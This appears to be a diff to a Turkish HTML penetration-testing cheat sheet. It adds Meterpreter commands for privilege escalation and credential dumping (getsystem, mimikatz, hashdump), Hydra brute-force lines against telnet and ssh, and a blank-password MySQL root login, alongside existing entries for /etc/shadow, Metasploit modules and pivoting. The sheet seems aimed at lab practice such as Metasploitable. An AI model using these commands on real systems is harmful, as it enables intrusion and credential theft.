@@ -57,7 +57,7 @@
     <tr><td class="kod">/etc/shadow</td><td class="desc">Kullanıcı şifreleri</td></tr>
     <tr><td class="kod">/etc/hostname</td><td class="desc">Hostname bilgisi</td></tr>
     <tr><td class="kod">/etc/hosts</td><td class="desc">Hosts dosyası</td></tr>
-
+    <tr><td><br></td></tr>
   </table>
 </div>
 
@@ -85,9 +85,13 @@
   </table>
 </br></hr>
 <span>Bulunan servis hakkında online zafiyet tarama <a href="http://www.cvedetails.com" target="_blank">www.cvedetails.com</a></span>
+<tr><td><br></td></tr>
 </div>
 
 <div class="tabcontent" id="Metasploit">
+  </br>
+  <span>mysql -u root -h [ip]    #default password bos birakilabilir.</span></br>
+  <span>searchsploit vsftpd #aranan servis hakkında detaylı metasploit modülleri gösterir.</span></br></br>
 	<table>
     <tr><th>Bilinen Metasploit Modülleri</th><th>Description</th></tr>
     <tr><td class="kod">auxiliary/scanner/ssh/ssh_login</td><td class="desc">ssh Bruteforce</td></tr>
@@ -110,15 +114,27 @@
 
 
     <tr><td><br></td></tr>
+    <tr><th>Meterpreter Komutları</th><th>Description</th></tr>
+    <tr><td>execute -F cmd.exe</td><td>Process başlatma</td></tr>
+    <tr><td>getsystem</td><td>Yetki yükseltme</td></tr>
+    <tr><td>use mimikatz</td><td>Ramden sifreleri okur.</td></tr>
+    <tr><td>hashdump</td><td>SAM Databaseden hashli sifreleri alır. 31d6 sifre yok demektir</td></tr>
+
+
+    <tr><td><br></td></tr>
     <tr><th>Pivoting</th><th>Description</th></tr>
     <tr><td>portfwd add -l 4444 -p 21 -r [IP]</td><td>Meterpreter: -l kaliport -p kurbanport -r kurbanip</td></tr>
     <tr><td class="kod">route add [ip] [mask] [session]</td><td class="desc">Kurbanın ip si verilir./32</td></tr>
 
     <tr><td><br></td></tr>
-    <tr><th>Wordlists</th><th>Description</th></tr>
-    <tr><td class="kod">/usr/share/metasploit-firmware/data/wordlists</td><td class="desc">Metasploit default wordlists</td></tr>
-    <tr><td class="kod">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.13.15/data/wordlists</td><td class="desc">Ruby wordlists.</td></tr>
+    <tr><th>Hydra</th><th>Description</th></tr>
+    <tr><td>hydra -L user.lst -P pass.lst telnet://IP</td><td>Telnet bruteforce</td></tr>
+    <tr><td class="kod">hydra -C metasploitableuserpass.txt IP ssh</td><td class="desc">ssh bruteforce</td></tr>
 
+    <tr><td><br></td></tr>
+    <tr><th>Wordlist</th><th>Description</th></tr>
+    <tr><td class="kod">/usr/share/metasploit-firmware/data/wordlists</td><td class="desc">Metasploit default wordlists</td></tr>
+    <tr><td><br></td></tr>
   </table>
 </div>
 
